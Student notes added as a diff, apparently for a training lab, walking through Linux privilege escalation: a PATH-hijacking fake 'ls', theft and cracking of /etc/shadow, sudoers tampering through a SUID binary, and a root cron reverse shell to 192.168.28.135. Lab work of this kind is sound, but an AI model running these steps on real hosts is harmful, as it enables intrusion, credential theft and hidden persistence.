@@ -1,0 +1,271 @@
+Donovian Linux Privilege Escalation, and Persistence (DLP)
+
+Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Linux hosts.
+
+Scenario Credentials: FLAG = H@RDl1nux5t@rt0F@ct1v1ty
+
+Prior Approvals: Privilege escalation, persistence, and restarting of services through host reboot. Host survey and log sanitation utilizing native command shells, which shell is at discretion of student. NOT authorized is uploading of tools or altering account information.
+
+Target Section:
+
+Pivot
+Hostname: Donovian-Terminal
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+PSP: rkhunter
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: unknown
+IP: 192.168.28.27
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+T2
+Hostname: unknown
+IP: 192.168.28.12
+OS: Linux ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: unknown
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+===========================================================================================
+
+Step 1: Scan the network
+# Create Tunnel to the pivot
+student@lin-ops:~$ student@lin-ops:~$ ssh student@10.50.36.37 -L 2000:192.168.28.105:2222 -NT
+
+# Setup Proxychains to scan
+student@lin-ops:~$ ssh comrade@0.0.0.0 -p 2000 -D 9050 -NT
+	
+student@lin-ops:~$ nmap -Pn -T4 <T_IP> -p<1-10000>
+	
+	
+Step 2: Create a Tunnel to T1 using the grey-host & pivot
+---------------------------------------------------------
+
+# Tunnel to T1
+student@lin-ops:~$ ssh comrade@0.0.0.0 -p 2000 -L 3000:192.168.28.27:22 -NT
+
+#SSH to T1
+student@lin-ops:~$ ssh comrade@0.0.0.0 -p 2000
+
+Enumerate: "A Dot in users path"
+
+There is a user on the system with the ability to sudo certain 
+programs that has a '.' dot in their path and is navigating to
+ and listing the contents of common world writable directories 
+ approximately every five minutes.
+
+The user's script is running like this:
+
+cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
+
+The flag is located in this users home directory
+
+	Solution: Create a file 'ls'
+	$ vim ls
+	
+	script:
+	
+	#!/bin/bash 
+	/bin/cat f!@g1.txt > /tmp/enum_flag
+	
+	
+	# Chmod it!
+	comrade@lin2:~$ chmod +x /tmp/ls
+
+
+	# Cat the file 
+
+	comrade@lin2:~$ cat /tmp/enum_person 
+	/tmp
+	10-million-password-list-top-10000.txt
+	f!@g1.txt
+	logs
+
+	#Now modify the script to steal the file contents
+	
+	#!/bin/bash 
+	/bin/cat ~/f!@g1.txt > /tmp/enum_flag
+	
+	# The flag is in the file :)
+	
+Priviledge Escalation
+	A command this user is able to sudo can be abused to obtain 
+	access as another user. This may take some research and effort 
+	to obtain root access with it.
+
+	It is possible that your initial user does not have sudo privileges 
+	and that you will need to move laterally to another account.
+
+	***The flag can be found under the root profile directory***
+	
+Step 1. Cry
+Step 2. See if I can sudo anything
+	$sudo -l 
+		No bueno
+	
+	$ find / -type f -perm /4000 -ls 2>/dev/null
+		Nothing helpful
+
+	See if the guy using the dot in PATH has sudo -l
+	
+	You can use cat, so modify the ls script
+	
+	#!/bin/bash 
+
+	/bin/cat ~/10-million-password-list-top-10000.txt > /tmp/passwords.txt
+	sudo /bin/cat /etc/shadow  > /tmp/shadowBinder.txt
+
+Copy them to your linops
+
+student@lin-ops:~$ scp -P 2099 comrade@0.0.0.0:/tmp/passwords.txt .
+comrade@0.0.0.0's password: 
+passwords.txt 
+
+student@lin-ops:~$ scp -P 2099 comrade@0.0.0.0:/tmp/shadowBinder.txt .
+comrade@0.0.0.0's password: 
+shadowBinder.txt      
+
+Install John
+
+	student@lin-ops:~$ john
+	Command 'john' not found, but can be installed with:
+	sudo apt install john
+	student@lin-ops:~$ sudo apt install john
+
+	Run John:
+	student@lin-ops:~$ john --wordlist=<wordlist> <passwordfile> 
+
+	ghjcnbnenrf      (zeus)
+
+
+	comrade@lin2:~$ su zues
+	No passwd entry for user 'zues'
+	comrade@lin2:~$ su zeus
+	Password: 
+	root@lin2:/home/comrade# cd ..
+	root@lin2:/home# cd ..
+	root@lin2:/# cd
+	root@lin2:~# whoami
+	root
+
+
+
+Priv 2: Root Access
+
+
+# Tunnel to T2
+student@lin-ops:~$ ssh comrade@0.0.0.0 -p 2000 -L 4000:192.168.28.12:22 -NT
+
+#SSH to T2
+student@lin-ops:~$ ssh comrade@0.0.0.0 -p 4000
+
+	run:
+	comrade@lin1:~$ find / -type f -perm /6000 -ls 2>/dev/null 
+
+This one is sus af:
+	/var/tmp/testbed/unknown
+
+	Run this!
+	
+	comrade@lin1:~$ /var/tmp/testbed/unknown 1 2
+	comrade@lin1:~$ ls
+	1
+	comrade@lin1:~$ ls 1
+	1
+	comrade@lin1:~$ ls 1/
+	ls: cannot access '1/': Not a directory
+	comrade@lin1:~$ cat 1
+	2
+	2
+	2
+	
+	/var/tmp/testbed/unknown <filename> <contents of file>
+
+
+
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults	env_reset
+Defaults	mail_badpass
+Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root	ALL=(ALL:ALL) ALL
+
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo	ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+>>>>comrade	ALL=(ALL:ALL) ALL # effecitvely add this to the end
+
+
+comrade@lin1:~$ /var/tmp/testbed/unknown test "cat testfile.txt" 
+comrade@lin1:~$ cat test
+testfile.txt
+cat testfile.txt
+Invalid number of arguments
+comrade@lin1:~$ /var/tmp/testbed/unknown test testfile.txt 
+comrade@lin1:~$ cat test
+testfile.txt
+cat testfile.txt
+testfile.txt
+comrade@lin1:~$ 
+comrade@lin1:~$ 
+comrade@lin1:~$ /var/tmp/testbed/unknown /etc/sudoers "comrade ALL=(ALL:ALL) ALL"
+comrade@lin1:~$ 
+comrade@lin1:~$ 
+comrade@lin1:~$ sudo -l
+[sudo] password for comrade: 
+Matching Defaults entries for comrade on lin1:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User comrade may run the following commands on lin1:
+    (ALL : ALL) ALL
+
+comrade@lin1:~$ sudo cat /etc/shadow
+root:*:18325:0:99999:7:::
+zeus:$6$XR7TNfob$dS6cF5Ha0qt/CQW7E9bAZ0lCFXiyED3qi5y7KMN1z49iCkC31oTVmxkUus5sP.49FS7Py11cp0X8JmL7mJ1yL0:18934:0:99999:7:::
+daemon:*:18325:0:99999:7:::
+bin:*:18325:0:99999:7:::
+
+# This binary appended the second parameter to the file passed as the first parameter 
+
+
+Persist 1 -CRON
+
+Add this to crontab
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *	* * *	root	/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
